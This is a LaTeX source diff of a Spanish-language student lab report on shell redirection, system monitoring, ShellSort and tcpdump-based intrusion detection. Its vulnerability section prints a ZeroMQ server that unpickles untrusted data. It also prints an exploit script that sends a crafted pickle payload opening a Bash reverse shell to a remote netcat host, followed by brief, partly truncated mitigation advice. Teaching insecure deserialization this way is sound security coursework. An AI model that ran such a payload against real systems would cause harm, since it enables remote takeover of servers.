@@ -1,0 +1,319 @@
+\documentclass[a4paperx]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{float}
+\usepackage{fancyhdr}
+\pagestyle{fancy}
+\fancyhf{}
+%\usepackage{pstricks-add}
+\pagestyle{empty}
+
+\fancyhead[LE,RO]{\bfseries\thepage}
+\fancyhead[LO]{\bfseries\rightmark}
+\fancyhead[RE]{\bfseries\leftmark}
+
+\usepackage{amssymb}
+\usepackage{amsmath}
+\usepackage{amscd}
+\usepackage{amsthm}
+
+
+\renewcommand{\headrulewidth}{0.5pt}
+\renewcommand{\footrulewidth}{0pt}
+\renewcommand{\thefootnote}{\arabic{footnote}} 
+%\renewcommand{\chaptermark}[1]{\markboth{#1}{}}
+\renewcommand{\sectionmark}[1]{\markright{\thesection.\ #1}}
+%
+\fancyhead[LE,RO]{\bfseries\thepage}
+\fancyhead[LO]{\bfseries\rightmark}
+\fancyhead[RE]{\bfseries\leftmark}
+
+
+\usepackage{amssymb}
+\usepackage{amsmath}
+\usepackage{amscd}
+\usepackage{amsthm}
+%\usepackage[latin1]{inputenc}
+%\usepackage[english]{babel}
+\usepackage[spanish,mexico]{babel}
+\usepackage{enumerate}
+\usepackage{pgf,tikz}
+\usepackage{makeidx}
+\usetikzlibrary{arrows}
+\usepackage{graphicx}
+\usepackage{float}
+\usepackage{pstricks-add}
+\usepackage{pgf,tikz}
+\usepackage{mathrsfs}
+\usetikzlibrary{arrows}
+\usepackage[colorlinks=true, linkcolor=blue, urlcolor=red, citecolor=red]{hyperref}
+\usepackage{wrapfig}
+
+\usepackage[Glenn]{fncychap}
+\ChNameVar{\bfseries\Large}
+\ChNumVar{\Huge}
+\ChTitleVar{\bfseries\Large}
+\ChRuleWidth{0.5 pt}
+\ChNameUpperCase
+\ChTitleUpperCase
+\makeindex
+
+
+\begin{document}
+
+\title{Pr\'actica 1}
+\author{
+Aguilar Z\'u\~niga,Gibran 308071087 \and  Alexis Hernández castro 313006636 \and Jesus Martin Ortega Martinez 310183534 \and Daniel Lopez Hernández 309167282 \and Jaime Alberto Martínez López 309256753
+}
+
+\maketitle
+
+\begin{abstract}
+Manejo de Shell y Bash.
+\end{abstract}
+
+\section{Preguntas}
+
+\begin{enumerate}
+
+\item{Redirecci\'on}\\
+
+\begin{enumerate}
+
+\item{Redirecci\'on}\\
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{Redireccionamiento1}
+\caption{Programa de redireccionamiento}
+\end{figure}
+
+\item{Exploit}\\
+
+Ver el c\'odigo en la carpeta de c\'odigos.
+
+\item{Ejecutar el programa en python para levantar un servidor con el puerto 54321, que podr\'a ser accedido localmente.}\\
+
+\item{Emplear el programa Exploit para realizar la conex\'on al servidor, y modificar la parte que se especifica para el exploit para emplear una  redirecci\'on.  La  conex\'on  se  realiza\'a  con  el  siguiente  comando python exploit.py—nc 127.0.0.1 54321.
+}\\
+
+\item{La finalidad de este ejercicio es obtener un reverse shell (investigar este concepto) a trav\'es de la ejecuci\'on de redirecciones inyectadas en el objeto, toda la redirecci\'on debe hacerse a tra\'es del descriptor de archivo del socket}\\
+
+\end{enumerate}
+
+El traspaso de shell, en seguridad de red, se refiere al acto de redirigir la entrada y salida de un shell a un servicio para que se pueda acceder de forma remota.\\
+
+En computaci\'on, el m\'etodo m\'as b\'asico para interactuar con el sistema operativo es el shell. En los sistemas basados ​​en Microsoft Windows, este es un programa llamado CMD.EXE o COMMAND.COM. En sistemas basados ​​en Linux o Unix, puede ser cualquiera de una variedad de programas como bash, ksh, etc. Este programa acepta comandos escritos desde un indicador y los ejecuta, generalmente en tiempo real, mostrando los resultados a lo que se conoce como est\'andar Salida, generalmente un monitor o pantalla.\\
+
+En el proceso de "shoveling", uno de estos programas está configurado para ejecutarse (quizás en silencio o sin notificar a alguien que observa la computadora) aceptando la entrada de un sistema remoto y redirigiendo la salida al mismo sistema remoto; por lo tanto, el operador de la cáscara con pala puede operar la computadora como si estuvieran presentes en la consola.\\
+
+\item{Describir la vulnerabilidad presente en el c\'odigo anterior y describir como mitigarla.}\\
+
+Hay m\'ultiples vulnerabilidad en el c\'odigo, primero una de ellas es el protocolo que utiliza para alzar el servidor que es http, otro error es que si mandas un dato malisioso o de una fuente no identificada. El siguiente c\'odigo muestra un ejemplo de  vulnerabilidad de lo mencionado anteriormente y el segundo c\'odigo muestra como vulnerar la seguridad.\\
+
+import zmq\\
+
+import cPickle as pickle\\
+
+class Server(object):\\
+ \quad  def \_init \_(self):\\
+  \quad context = zmq.Context()\\
+
+   \quad   self.receiver = context.socket(zmq.PULL)\\
+    \quad  self.receiver.bind($"tcp://*:1234"$)\\
+
+     \quad   self.sender = context.socket(zmq.PUSH)\\
+    \quad    self.sender.bind($"tcp://*:1235"$)\\
+
+    def send(self, data):\\
+      \quad  self.sender.send(pickle.dumps(data))\\
+
+    def recv(self):\\
+    \quad    data = self.receiver.recv()\\
+      \quad  return pickle.loads(data)\\
+      
+      
+  luego escuchamos el servidor con los siguientes comandos:\\
+  
+server = Server()\\
+server.recv()\\
+
+Luego abrimos un netcat con comando nc -l -p 9000 en un servidor accesible y corremos siguiente c\'odigo :\\
+
+import sys\\
+import zmq\\
+
+def main():\\
+ \quad   server\_host = $'98.76.54.32'$ \\
+  \quad  netcat\_host = $'12.34.56.78'$ \\
+
+   \quad context = zmq.Context()\\
+ \quad   zmq\_socket = context.socket(zmq.PUSH)\\
+ \quad   zmq\_socket.connect('tcp:// \%s:1234' \% server\_host)\\
+
+   \quad shellcode = cposix $ \setminus $ nsystem $\setminus $ np0$\setminus$ n(S'/bin/bash -i \&gt;\&amp; /dev/tcp/\%s/9000\\
+   
+ \quad  0\&gt;\&amp;1'$ \setminus $p1$ \setminus $tp2$ \setminus $Rp3$ \setminus $." \% netcat\_host\\
+  \quad  zmq\_socket.send(shellcode)\\
+ \quad   \# we get a reverse shell on the netcat host\\
+
+if \_name\_ == "\_main\_":\\
+. \qquad main()
+
+Hay muchas cosas por hacer para mejorar estos problemas, primero defender tu estructura de tu servidor como la base de datos encriptando con tablas hash las contrase\~nas de tus usuarios, y s\'olo confiar en datos enviados desde tu servidor como memoria cah\'e u otros destinos o s\'olo aceptar de servidores con certifica.\\
+
+\begin{enumerate}
+
+\item{S\'olo evitar accesos}\\
+
+La forma más fácil de protegernos es no usar pickle a menos que sea realmente necesario, y verificar nuestras dependencias para ver si son vulnerables a estos (y otros) ataques. Si todo lo que necesitamos es un formato de serialización para datos, JSON probablemente sea suficiente.\\
+
+\item{No confíes en nadie}\\
+
+Este es solo otro caso de atackers que utilizan datos no validados para ingresar a nuestro sistema. Al igual que con cualquier información enviada por el usuario, debemos asegurarnos de que no se está falsificando y / o que nuestro código puede manejar datos maliciosos con gracia (también, más difícil de lo que parece).\\
+
+\item{Mejores interfaces}\\
+
+La mejor manera de evitar ver cualquier vulnerabilidad en la naturaleza es educarnos para saber cuándo una pieza de código es vulnerable. Como desarrolladores de API, una forma de hacerlo es asegurarse de que las acciones inseguras generen las advertencias necesarias o que se autodocumenten. En el caso de pickle me gustaría ver:
+
+\end{enumerate}
+
+\item{Monitoreo}\\
+
+\begin{enumerate}
+
+\item{Implementar un shell script desarrollado en sh, bash, ksh o csh que muestre en tiempo real}\\
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{monitoreo}
+\caption{Programa de monitoreo}
+\end{figure}
+
+\begin{enumerate}
+
+\item{Empleo de recursos del sistema operativo}\\
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{ArchivoDumpFile}
+\caption{Programa de recursos}
+\end{figure}
+
+\item{Procesos}\\
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{escucha con tcpdump}
+\caption{Programa de prosesos}
+\end{figure}
+
+
+\item{Dispositivos en uso}\\
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{monitoreo}
+\caption{Programa de dispositivos de uso}
+\end{figure}
+
+
+\item{Conexiones activas}\\
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{ArchivoDumpFile}
+\caption{Programa de conexiones activas}
+\end{figure}
+
+
+\item{Archivos en uso}\\
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{escucha con tcpdump}
+\caption{Programa de archivos de uso}
+\end{figure}
+
+\item{Modificaci\'on de archivos}\\
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{monitoreo}
+\caption{Programa de Modificaci\'on de archivos}
+\end{figure}
+
+\item{Alteraciones o cambios en el sistema de archivos}\\
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{ArchivoDumpFile}
+\caption{Programa de Alteraciones o cambios en el sistema de archivos}
+\end{figure}
+
+
+
+\end{enumerate}
+
+\end{enumerate}
+
+\item{ShellSort. Desarrollar un script en bash, que realice el ordenamiento de un conjunto de elementos enviados a trav \'es de linea de comandos, o un archivo, empleando el algoritmo ShellSort}\\
+
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{ShellNumber}
+\caption{Programa de ShellNumber}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{ShellText}
+\caption{Programa de ShellText}
+\end{figure}
+
+
+
+\item{Intrusion Detection}\\
+
+\begin{enumerate}
+
+\item{Desarrollar un script en bash, que realice el analisis de tr\'afico de red en tiempo real y detecte patrones que resulten anomalos o peligrosos(Definirlo en el README de la practica, puede ser desde un ping, hasta visitar un sitio web no permitido).}\\
+
+\item{Para esta practica son necesarios unicamente los comandos tcpdump y grep como base.}\\
+
+\item{El script debe reportar en tiempo real el comportamiento anomalo, por ejemplo, se detect\'o a las 12:45 horas del 09/Agosto/2018 un ping no autorizado.}\\
+
+\end{enumerate}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{TraficoRed}
+\caption{Programa de TraficoRed}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.65\textwidth]{ArchivoDumpFile}
+\caption{Programa de ArchivoDumpFile}
+\end{figure}
+
+
+Gawk Reverse Shell
+\end{enumerate}
+
+
+
+\addcontentsline{toc}{chapter}{Bibliografía}
+\begin{thebibliography}{99}
+
+\bibitem{Shell}  https://lincolnloop.com/blog/playing-pickle-security/. {\it Fundamentos de sistemas operativos}. 
+
+\bibitem{ShellSort}  https://www.geeksforgeeks.org/sort-command-linuxunix-examples/. {\it Fundamentos de sistemas operativos}. 
+
+\end{thebibliography}
+
+\
+
+
+\end{document}
